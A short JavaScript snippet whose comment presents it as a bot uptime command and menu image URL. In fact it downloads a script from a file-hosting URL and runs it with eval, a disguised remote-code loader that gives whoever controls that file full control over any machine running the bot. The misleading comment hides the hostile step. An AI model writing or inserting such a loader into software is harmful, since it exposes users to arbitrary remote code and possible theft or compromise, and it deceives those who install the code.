//BOT UPTIME COMMAND AND MENU IMAGE URL

const axios = require('axios');

const url = "https://files.catbox.moe/tr1q2q.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));